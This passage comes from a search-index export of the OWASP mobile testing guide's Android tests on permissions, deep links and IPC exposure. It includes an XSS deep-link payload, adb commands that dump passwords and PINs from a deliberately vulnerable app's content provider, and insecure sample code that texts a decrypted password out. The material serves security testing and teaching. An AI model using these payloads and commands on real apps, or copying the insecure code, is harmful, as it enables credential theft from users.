developers of the application, who doesn't have to submit the Permissions Declaration Form.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0024/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Permissions for installed applications can be retrieved with <code>adb</code>. The following extract demonstrates how to examine the permissions used by an application.</p> <pre><code>$ adb shell dumpsys package com.google.android.youtube\n...\ndeclared permissions:\n  com.google.android.youtube.permission.C2D_MESSAGE: prot=signature, INSTALLED\nrequested permissions:\n  android.permission.INTERNET\n  android.permission.ACCESS_NETWORK_STATE\ninstall permissions:\n  com.google.android.c2dm.permission.RECEIVE: granted=true\n  android.permission.USE_CREDENTIALS: granted=true\n  com.google.android.providers.gsf.permission.READ_GSERVICES: granted=true\n...\n</code></pre> <p>The output shows all permissions using the following categories:</p> <ul> <li>declared permissions: list of all custom permissions.</li> <li>requested and install permissions: list of all install-time permissions including normal and signature permissions.</li> <li>runtime permissions: list of all dangerous permissions.</li> </ul> <p>When doing the dynamic analysis:</p> <ul> <li>Evaluate whether the app really needs the requested permissions. For instance: a single-player game that requires access to <code>android.permission.WRITE_SMS</code>, might not be a good idea.</li> <li>In many cases the app could opt for alternatives to declaring permissions, such as:<ul> <li>requesting the <code>ACCESS_COARSE_LOCATION</code> permission instead of <code>ACCESS_FINE_LOCATION</code>. Or even better not requesting the permission at all, and instead ask the user to enter a postal code.</li> <li>invoking the <code>ACTION_IMAGE_CAPTURE</code> or <code>ACTION_VIDEO_CAPTURE</code> intent action instead of requesting the <code>CAMERA</code> permission.</li> <li>using Companion Device Pairing (Android 8.0 (API level 26) and higher) when pairing with a Bluetooth device instead of declaring the <code>ACCESS_FINE_LOCATION</code>, <code>ACCESS_COARSE_LOCATIION</code>, or <code>BLUETOOTH_ADMIN</code> permissions.</li> </ul> </li> <li>Use the Privacy Dashboard (Android 12 (API level 31) and higher) to verify how the app explains access to sensitive information.</li> </ul> <p>To obtain detail about a specific permission you can refer to the Android Documentation.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-1","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/","title":"MASTG-TEST-0028: Testing Deep Links","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0028: Testing Deep Links (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#overview","title":"Overview","text":"<p>Any existing deep links (including App Links) can potentially increase the app attack surface. This includes many risks such as link hijacking, sensitive functionality exposure, etc.</p> <ul> <li>Before Android 12 (API level 31), if the app has any non-verifiable links, it can cause the system to not verify all Android App Links for that app.</li> <li>Starting on Android 12 (API level 31), apps benefit from a reduced attack surface. A generic web intent resolves to the user's default browser app unless the target app is approved for the specific domain contained in that web intent.</li> </ul> <p>All deep links must be enumerated and verified for correct website association. The actions they perform must be well tested, especially all input data, which should be deemed untrustworthy and thus should always be validated.</p> <p>None of the input from these sources can be trusted; it must be validated and/or sanitized. Validation ensures processing of data that the app is expecting only. If validation is not enforced, any input can be sent to the app, which may allow an attacker or malicious app to exploit app functionality.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#static-analysis","title":"Static Analysis","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#check-for-android-os-version","title":"Check for Android OS Version","text":"<p>The Android version in which the app runs also influences the risk of using deep links. Inspect the Android Manifest to check if <code>minSdkVersion</code> is 31 or higher.</p> <ul> <li>Before Android 12 (API level 31), if the app has any non-verifiable deep links, it can cause the system to not verify all Android App Links for that app.</li> <li>Starting on Android 12 (API level 31), apps benefit from a reduced attack surface. A generic web intent resolves to the user's default browser app unless the target app is approved for the specific domain contained in that web intent.</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#check-for-deep-link-usage","title":"Check for Deep Link Usage","text":"<p>Inspecting the Android Manifest:</p> <p>You can easily determine whether deep links (with or without custom URL schemes) are defined by  Exploring the App Package and inspecting the Android Manifest file looking for <code>&lt;intent-filter&gt;</code> elements.</p> <ul> <li>Custom Url Schemes: The following example specifies a deep link with a custom URL scheme called <code>myapp://</code>.</li> </ul> <pre><code>&lt;activity android:name=\".MyUriActivity\"&gt;\n  &lt;intent-filter&gt;\n      &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n      &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n      &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n      &lt;data android:scheme=\"myapp\" android:host=\"path\" /&gt;\n  &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre> <ul> <li>Deep Links: The following example specifies a deep Link using both the <code>http://</code> and <code>https://</code> schemes, along with the host and path that will activate it (in this case, the full URL would be <code>https://www.myapp.com/my/app/path</code>):</li> </ul> <pre><code>&lt;intent-filter&gt;\n  ...\n  &lt;data android:scheme=\"http\" android:host=\"www.myapp.com\" android:path=\"/my/app/path\" /&gt;\n  &lt;data android:scheme=\"https\" android:host=\"www.myapp.com\" android:path=\"/my/app/path\" /&gt;\n&lt;/intent-filter&gt;\n</code></pre> <ul> <li>App Links: If the <code>&lt;intent-filter&gt;</code> includes the flag <code>android:autoVerify=\"true\"</code>, this causes the Android system to reach out to the declared <code>android:host</code> in an attempt to access the Digital Asset Links file in order to verify the App Links. A deep link can be considered an App Link only if the verification is successful.</li> </ul> <pre><code>&lt;intent-filter android:autoVerify=\"true\"&gt;\n</code></pre> <p>When listing deep links remember that <code>&lt;data&gt;</code> elements within the same <code>&lt;intent-filter&gt;</code> are actually merged together to account for all variations of their combined attributes.</p> <pre><code>&lt;intent-filter&gt;\n  ...\n  &lt;data android:scheme=\"https\" android:host=\"www.example.com\" /&gt;\n  &lt;data android:scheme=\"app\" android:host=\"open.my.app\" /&gt;\n&lt;/intent-filter&gt;\n</code></pre> <p>It might seem as though this supports only <code>https://www.example.com</code> and <code>app://open.my.app</code>. However, it actually supports:</p> <ul> <li><code>https://www.example.com</code></li> <li><code>app://open.my.app</code></li> <li><code>app://www.example.com</code></li> <li><code>https://open.my.app</code></li> </ul> <p>Using Dumpsys:</p> <p>Use  adb to run the following command that will show all schemes:</p> <pre><code>adb shell dumpsys package com.example.package\n</code></pre> <p>Using Android \"App Link Verification\" Tester:</p> <p>Use the Android \"App Link Verification\" Tester script to list all deep links (<code>list-all</code>) or only app links (<code>list-applinks</code>):</p> <pre><code>python3 deeplink_analyser.py -op list-all -apk ~/Downloads/example.apk\n\n.MainActivity\n\napp://open.my.app\napp://www.example.com\nhttps://open.my.app\nhttps://www.example.com\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#check-for-correct-website-association","title":"Check for Correct Website Association","text":"<p>Even if deep links contain the <code>android:autoVerify=\"true\"</code> attribute, they must be actually verified in order to be considered App Links. You should test for any possible misconfigurations that might prevent full verification.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#automatic-verification","title":"Automatic Verification","text":"<p>Use the Android \"App Link Verification\" Tester script to get the verification status for all app links (<code>verify-applinks</code>). See an example here.</p> <p>Only on Android 12 (API level 31) or higher:</p> <p>You can use  adb to test the verification logic regardless of whether the app targets Android 12 (API level 31) or not. This feature allows you to:</p> <ul> <li>invoke the verification process manually.</li> <li>reset the state of the target app's Android App Links on your device.</li> <li>invoke the domain verification process.</li> </ul> <p>You can also review the verification results. For example:</p> <pre><code>adb shell pm get-app-links com.example.package\n\ncom.example.package:\n    ID: 01234567-89ab-cdef-0123-456789abcdef\n    Signatures: [***]\n    Domain verification state:\n      example.com: verified\n      sub.example.com: legacy_failure\n      example.net: verified\n      example.org: 1026\n</code></pre> <p>The same information can be found by running <code>adb shell dumpsys package com.example.package</code> (only on Android 12 (API level 31) or higher).</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#manual-verification","title":"Manual Verification","text":"<p>This section details a few, of potentially many, reasons why the verification process failed or was not actually triggered. See more information in the Android Developers Documentation and in the white paper \"Measuring the Insecurity of Mobile Deep Links of Android\".</p> <p>Check the Digital Asset Links file:</p> <ul> <li>Check for missing Digital Asset Links file:<ul> <li>try to find it in the domain's <code>/.well-known/</code> path. Example: <code>https://www.example.com/.well-known/assetlinks.json</code></li> <li>or try <code>https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=www.example.com</code></li> </ul> </li> <li>Check for valid Digital Asset Links file served via HTTP.</li> <li>Check for invalid Digital Asset Links files served via HTTPS. For example:<ul> <li>the file contains invalid JSON.</li> <li>the file doesn't include the target app's package.</li> </ul> </li> </ul> <p>Check for Redirects:</p> <p>To enhance the app security, the system doesn't verify any Android App Links for an app if the server sets a redirect such as <code>http://example.com</code> to <code>https://example.com</code> or <code>example.com</code> to <code>www.example.com</code>.</p> <p>Check for Subdomains:</p> <p>If an intent filter lists multiple hosts with different subdomains, there must be a valid Digital Asset Links file on each domain. For example, the following intent filter includes <code>www.example.com</code> and <code>mobile.example.com</code> as accepted intent URL hosts.</p> <pre><code>&lt;application&gt;\n  &lt;activity android:name=\u201dMainActivity\u201d&gt;\n    &lt;intent-filter android:autoVerify=\"true\"&gt;\n      &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n      &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n      &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n      &lt;data android:scheme=\"https\" /&gt;\n      &lt;data android:scheme=\"https\" /&gt;\n      &lt;data android:host=\"www.example.com\" /&gt;\n      &lt;data android:host=\"mobile.example.com\" /&gt;\n    &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n&lt;/application&gt;\n</code></pre> <p>In order for the deep links to correctly register, a valid Digital Asset Links file must be published at both <code>https://www.example.com/.well-known/assetlinks.json</code> and <code>https://mobile.example.com/.well-known/assetlinks.json</code>.</p> <p>Check for Wildcards:</p> <p>If the hostname includes a wildcard (such as <code>*.example.com</code>), you should be able to find a valid Digital Asset Links file at the root hostname: <code>https://example.com/.well-known/assetlinks.json</code>.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#check-the-handler-method","title":"Check the Handler Method","text":"<p>Even if the deep link is correctly verified, the logic of the handler method should be carefully analyzed. Pay special attention to deep links being used to transmit data (which is controlled externally by the user or any other app).</p> <p>First, obtain the name of the Activity from the Android Manifest <code>&lt;activity&gt;</code> element which defines the target <code>&lt;intent-filter&gt;</code> and search for usage of <code>getIntent</code> and <code>getData</code>. This general approach of locating these methods can be used across most applications when performing reverse engineering and is key when trying to understand how the application uses deep links and handles any externally provided input data and if it could be subject to any kind of abuse.</p> <p>The following example is a snippet from an example Kotlin app decompiled with  jadx. From the static analysis we know that it supports the deep link <code>deeplinkdemo://load.html/</code> as part of <code>com.mstg.deeplinkdemo.WebViewActivity</code>.</p> <pre><code>// snippet edited for simplicity\npublic final class WebViewActivity extends AppCompatActivity {\n    private ActivityWebViewBinding binding;\n\n    public void onCreate(Bundle savedInstanceState) {\n        Uri data = getIntent().getData();\n        String html = data == null ? null : data.getQueryParameter(\"html\");\n        Uri data2 = getIntent().getData();\n        String deeplink_url = data2 == null ? null : data2.getQueryParameter(\"url\");\n        View findViewById = findViewById(R.id.webView);\n        if (findViewById != null) {\n            WebView wv = (WebView) findViewById;\n            wv.getSettings().setJavaScriptEnabled(true);\n            if (deeplink_url != null) {\n                wv.loadUrl(deeplink_url);\n            ...\n</code></pre> <p>You can simply follow the <code>deeplink_url</code> String variable and see the result from the <code>wv.loadUrl</code> call. This means the attacker has full control of the URL being loaded to the WebView (as shown above has  Testing JavaScript Execution in WebViews.</p> <p>The same WebView might be also rendering an attacker controlled parameter. In that case, the following deep link payload would trigger Reflected Cross-Site Scripting (XSS) within the context of the WebView:</p> <pre><code>deeplinkdemo://load.html?attacker_controlled=&lt;svg onload=alert(1)&gt;\n</code></pre> <p>But there are many other possibilities. Be sure to check the following sections to learn more about what to expect and how to test different scenarios:</p> <ul> <li>\"Cross-Site Scripting Flaws\".</li> <li>\"Injection Flaws\".</li> <li> Testing Object Persistence.</li> <li> Testing for URL Loading in WebViews</li> <li> Testing JavaScript Execution in WebViews</li> <li> Testing WebView Protocol Handlers</li> </ul> <p>In addition, we recommend to search and read public reports (search term: <code>\"deep link*\"|\"deeplink*\" site:https://hackerone.com/reports/</code>). For example:</p> <ul> <li>\"[HackerOne#1372667] Able to steal bearer token from deep link\"</li> <li>\"[HackerOne#401793] Insecure deeplink leads to sensitive information disclosure\"</li> <li>\"[HackerOne#583987] Android app deeplink leads to CSRF in follow action\"</li> <li>\"[HackerOne#637194] Bypass of biometrics security functionality is possible in Android application\"</li> <li>\"[HackerOne#341908] XSS via Direct Message deeplinks\"</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Here you will use the list of deep links from the static analysis to iterate and determine each handler method and the processed data, if any. You will first start a  Frida hook and then begin invoking the deep links.</p> <p>The following example assumes a target app that accepts this deep link: <code>deeplinkdemo://load.html</code>. However, we don't know the corresponding handler method yet, nor the parameters it potentially accepts.</p> <p>[Step 1] Frida Hooking:</p> <p>You can use the script \"Android Deep Link Observer\" from  Frida CodeShare to monitor all invoked deep links triggering a call to <code>Intent.getData</code>. You can also use the script as a base to include your own modifications depending on the use case at hand. In this case we included the stack trace in the script since we are interested in the method which calls <code>Intent.getData</code>.</p> <p>[Step 2] Invoking Deep Links:</p> <p>Now you can invoke any of the deep links using  adb and the Activity Manager (am) which will send intents within the Android device. For example:</p> <pre><code>adb shell am start -W -a android.intent.action.VIEW -d \"deeplinkdemo://load.html/?message=ok#part1\"\n\nStarting: Intent { act=android.intent.action.VIEW dat=deeplinkdemo://load.html/?message=ok }\nStatus: ok\nLaunchState: WARM\nActivity: com.mstg.deeplinkdemo/.WebViewActivity\nTotalTime: 210\nWaitTime: 217\nComplete\n</code></pre> <p>This might trigger the disambiguation dialog when using the \"http/https\" schema or if other installed apps support the same custom URL schema. You can include the package name to make it an explicit intent.</p> <p>This invocation will log the following:</p> <pre><code>[*] Intent.getData() was called\n[*] Activity: com.mstg.deeplinkdemo.WebViewActivity\n[*] Action: android.intent.action.VIEW\n\n[*] Data\n- Scheme: deeplinkdemo://\n- Host: /load.html\n- Params: message=ok\n- Fragment: part1\n\n[*] Stacktrace:\n\nandroid.content.Intent.getData(Intent.java)\ncom.mstg.deeplinkdemo.WebViewActivity.onCreate(WebViewActivity.kt)\nandroid.app.Activity.performCreate(Activity.java)\n...\ncom.android.internal.os.ZygoteInit.main(ZygoteInit.java)\n</code></pre> <p>In this case we've crafted the deep link including arbitrary parameters (<code>?message=ok</code>) and fragment (<code>#part1</code>). We still don't know if they are being used. The information above reveals useful information that you can use now to reverse engineer the app. See the section \"Check the Handler Method\" to learn about things you should consider.</p> <ul> <li>File: <code>WebViewActivity.kt</code></li> <li>Class: <code>com.mstg.deeplinkdemo.WebViewActivity</code></li> <li>Method: <code>onCreate</code></li> </ul> <p>Sometimes you can even take advantage of other applications that you know interact with your target app. You can reverse engineer the app, (e.g. to extract all strings and filter those which include the target deep links, <code>deeplinkdemo:///load.html</code> in the previous case), or use them as triggers, while hooking the app as previously discussed.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/","title":"MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#overview","title":"Overview","text":"<p>To test for sensitive functionality exposure through IPC mechanisms you should first enumerate all the IPC mechanisms the app uses and then try to identify whether sensitive data is leaked when the mechanisms are used.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#static-analysis","title":"Static Analysis","text":"<p>We start by looking at the AndroidManifest.xml, where all activities, services, and content providers included in the app must be declared (otherwise the system won't recognize them and they won't run).</p> <ul> <li><code>&lt;intent-filter&gt;</code></li> <li><code>&lt;service&gt;</code></li> <li><code>&lt;provider&gt;</code></li> <li><code>&lt;receiver&gt;</code></li> </ul> <p>An \"exported\" activity, service, or content can be accessed by other apps. There are two common ways to designate a component as exported. The obvious one is setting the export tag to true <code>android:exported=\"true\"</code>. The second way involves defining an <code>&lt;intent-filter&gt;</code> within the component element (<code>&lt;activity&gt;</code>, <code>&lt;service&gt;</code>, <code>&lt;receiver&gt;</code>). When this is done, the export tag is automatically set to \"true\". To prevent all other Android apps from interacting with the IPC component element, be sure that the <code>android:exported=\"true\"</code> value and an <code>&lt;intent-filter&gt;</code> aren't in their <code>AndroidManifest.xml</code> files unless this is necessary.</p> <p>Remember that using the permission tag (<code>android:permission</code>) will also limit other applications' access to a component. If your IPC is intended to be accessible to other applications, you can apply a security policy with the <code>&lt;permission&gt;</code> element and set a proper <code>android:protectionLevel</code>. When <code>android:permission</code> is used in a service declaration, other applications must declare a corresponding <code>&lt;uses-permission&gt;</code> element in their own manifest to start, stop, or bind to the service.</p> <p>For more information about the content providers, please refer to the test case \"Testing Whether Stored Sensitive Data Is Exposed via IPC Mechanisms\" in chapter \"Testing Data Storage\".</p> <p>Once you identify a list of IPC mechanisms, review the source code to see whether sensitive data is leaked when the mechanisms are used. For example, content providers can be used to access database information, and services can be probed to see if they return data. Broadcast receivers can leak sensitive information if probed or sniffed.</p> <p>In the following, we use two example apps and give examples of identifying vulnerable IPC components:</p> <ul> <li>\"Sieve\"</li> <li> InsecureBankv2</li> </ul>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#activities","title":"Activities","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#inspect-the-androidmanifest","title":"Inspect the AndroidManifest","text":"<p>In the \"Sieve\" app, we find three exported activities, identified by <code>&lt;activity&gt;</code>:</p> <pre><code>&lt;activity android:excludeFromRecents=\"true\" android:label=\"@string/app_name\" android:launchMode=\"singleTask\" android:name=\".MainLoginActivity\" android:windowSoftInputMode=\"adjustResize|stateVisible\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n        &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n&lt;activity android:clearTaskOnLaunch=\"true\" android:excludeFromRecents=\"true\" android:exported=\"true\" android:finishOnTaskLaunch=\"true\" android:label=\"@string/title_activity_file_select\" android:name=\".FileSelectActivity\" /&gt;\n&lt;activity android:clearTaskOnLaunch=\"true\" android:excludeFromRecents=\"true\" android:exported=\"true\" android:finishOnTaskLaunch=\"true\" android:label=\"@string/title_activity_pwlist\" android:name=\".PWList\" /&gt;\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#inspect-the-source-code","title":"Inspect the Source Code","text":"<p>By inspecting the <code>PWList.java</code> activity, we see that it offers options to list all keys, add, delete, etc. If we invoke it directly, we will be able to bypass the LoginActivity. More on this can be found in the dynamic analysis below.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#services","title":"Services","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#inspect-the-androidmanifest_1","title":"Inspect the AndroidManifest","text":"<p>In the \"Sieve\" app, we find two exported services, identified by <code>&lt;service&gt;</code>:</p> <pre><code>&lt;service android:exported=\"true\" android:name=\".AuthService\" android:process=\":remote\" /&gt;\n&lt;service android:exported=\"true\" android:name=\".CryptoService\" android:process=\":remote\" /&gt;\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#inspect-the-source-code_1","title":"Inspect the Source Code","text":"<p>Check the source code for the class <code>android.app.Service</code>:</p> <p>By reversing the target application, we can see that the service <code>AuthService</code> provides functionality for changing the password and PIN-protecting the target app.</p> <pre><code>   public void handleMessage(Message msg) {\n            AuthService.this.responseHandler = msg.replyTo;\n            Bundle returnBundle = msg.obj;\n            int responseCode;\n            int returnVal;\n            switch (msg.what) {\n                ...\n                case AuthService.MSG_SET /*6345*/:\n                    if (msg.arg1 == AuthService.TYPE_KEY) /*7452*/ {\n                        responseCode = 42;\n                        if (AuthService.this.setKey(returnBundle.getString(\"com.mwr.example.sieve.PASSWORD\"))) {\n                            returnVal = 0;\n                        } else {\n                            returnVal = 1;\n                        }\n                    } else if (msg.arg1 == AuthService.TYPE_PIN) {\n                        responseCode = 41;\n                        if (AuthService.this.setPin(returnBundle.getString(\"com.mwr.example.sieve.PIN\"))) {\n                            returnVal = 0;\n                        } else {\n                            returnVal = 1;\n                        }\n                    } else {\n                        sendUnrecognisedMessage();\n                        return;\n                    }\n           }\n   }\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#broadcast-receivers","title":"Broadcast Receivers","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#inspect-the-androidmanifest_2","title":"Inspect the AndroidManifest","text":"<p>In the \"Android Insecure Bank\" app, we find a broadcast receiver in the manifest, identified by <code>&lt;receiver&gt;</code>:</p> <pre><code>&lt;receiver android:exported=\"true\" android:name=\"com.android.insecurebankv2.MyBroadCastReceiver\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"theBroadcast\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#inspect-the-source-code_2","title":"Inspect the Source Code","text":"<p>Search the source code for strings like <code>sendBroadcast</code>, <code>sendOrderedBroadcast</code>, and <code>sendStickyBroadcast</code>. Make sure that the application doesn't send any sensitive data.</p> <p>If an Intent is broadcasted and received within the application only, <code>LocalBroadcastManager</code> can be used to prevent other apps from receiving the broadcast message. This reduces the risk of leaking sensitive information.</p> <p>To understand more about what the receiver is intended to do, we have to go deeper in our static analysis and search for usage of the class <code>android.content.BroadcastReceiver</code> and the <code>Context.registerReceiver</code> method, which is used to dynamically create receivers.</p> <p>The following extract of the target application's source code shows that the broadcast receiver triggers transmission of an SMS message containing the user's decrypted password.</p> <pre><code>public class MyBroadCastReceiver extends BroadcastReceiver {\n  String usernameBase64ByteString;\n  public static final String MYPREFS = \"mySharedPreferences\";\n\n  @Override\n  public void onReceive(Context context, Intent intent) {\n    // TODO Auto-generated method stub\n\n        String phn = intent.getStringExtra(\"phonenumber\");\n        String newpass = intent.getStringExtra(\"newpass\");\n\n    if (phn != null) {\n      try {\n                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);\n                final String username = settings.getString(\"EncryptedUsername\", null);\n                byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);\n                usernameBase64ByteString = new String(usernameBase64Byte, \"UTF-8\");\n                final String password = settings.getString(\"superSecurePassword\", null);\n                CryptoClass crypt = new CryptoClass();\n                String decryptedPassword = crypt.aesDeccryptedString(password);\n                String textPhoneno = phn.toString();\n                String textMessage = \"Updated Password from: \"+decryptedPassword+\" to: \"+newpass;\n                SmsManager smsManager = SmsManager.getDefault();\n                System.out.println(\"For the changepassword - phonenumber: \"+textPhoneno+\" password is: \"+textMessage);\nsmsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);\n          }\n     }\n  }\n}\n</code></pre> <p>BroadcastReceivers should use the <code>android:permission</code> attribute; otherwise, other applications can invoke them. You can use <code>Context.sendBroadcast(intent, receiverPermission);</code> to specify permissions a receiver must have to read the broadcast. You can also set an explicit application package name that limits the components this Intent will resolve to. If left as the default value (null), all components in all applications will be considered. If non-null, the Intent can match only the components in the given application package.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>You can enumerate IPC components with  MobSF. To list all exported IPC components, upload the APK file and the components collection will be displayed in the following screen:</p> <p></p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#content-providers","title":"Content Providers","text":"<p>The \"Sieve\" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:</p> <pre><code>$ adb shell dumpsys package com.mwr.example.sieve | grep -Po \"Provider{[\\w\\d\\s\\./]+}\" | sort -u\nProvider{34a20d5 com.mwr.example.sieve/.FileBackupProvider}\nProvider{64f10ea com.mwr.example.sieve/.DBContentProvider}\n</code></pre> <p>Once identified, you can use  jadx to reverse engineer the app and analyze the source code of the exported content providers to identify potential vulnerabilities.</p> <p>To identify the corresponding class of a content provider, use the following information:</p> <ul> <li>Package Name: <code>com.mwr.example.sieve</code>.</li> <li>Content Provider Class Name: <code>DBContentProvider</code>.</li> </ul> <p>When analyzing the class <code>com.mwr.example.sieve.DBContentProvider</code>, you'll see that it contains several URIs:</p> <pre><code>package com.mwr.example.sieve;\n...\npublic class DBContentProvider extends ContentProvider {\n    public static final Uri KEYS_URI = Uri.parse(\"content://com.mwr.example.sieve.DBContentProvider/Keys\");\n    public static final Uri PASSWORDS_URI = Uri.parse(\"content://com.mwr.example.sieve.DBContentProvider/Passwords\");\n...\n}\n</code></pre> <p>Use the following commands to call the content provider using the identified URIs:</p> <pre><code>$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/\nRow: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234\n\n$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/\nRow: 0 _id=1, service=test, username=test, password=BLOB, email=t@tedt.com\nRow: 1 _id=2, service=bank, username=owasp, password=BLOB, email=user@tedt.com\n\n$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection email:username:password --where 'service=\\\"bank\\\"'\nRow: 0 email=user@tedt.com, username=owasp, password=BLOB\n</code></pre> <p>You are able now to retrieve all database entries (see all lines starting with \"Row:\" in the output).</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0029/#activities_1","title":"Activities","text":"<p>To list activities exported by an application, you can use the following command and focus on <code>activity</code> elements:</p> <pre><code>$ aapt d xmltree sieve.apk AndroidManifest.xml\n...\nE: activity (line=32)\n  A: android:label(0x01010001)=@0x7f05000f\n  A: android:name(0x01010003)=\".FileSelectActivity\" (Raw: \".FileSelectActivity\")\n  A: android:exported(0x01010010)=(type 0x12)0xffffffff\n  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff\n  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\nE: activity (line=40)\n  A: android:label(0x01010001)=@0x7f050000\n  A: android:name(0x01010003)=\".MainLoginActivity\" (Raw: \".MainLoginActivity\")\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\n  A: android:launchMode(0x0101001d)=(type 0x10)0x2\n  A: android:windowSoftInputMode(0x0101022b)=(type 0x11)0x14\n  E: intent-filter (line=46)\n    E: action (line=47)\n      A: android:name(0x01010003)=\"android.intent.action.MAIN\" (Raw: \"android.intent.action.MAIN\")\n    E: category (line=49)\n      A: android:name(0x01010003)=\"android.intent.category.LAUNCHER\" (Raw: \"android.intent.category.LAUNCHER\")\nE: activity (line=52)\n  A: android:label(0x01010001)=@0x7f050009\n  A: android:name(0x01010003)=\".PWList\" (Raw: \".PWList\")\n  A: 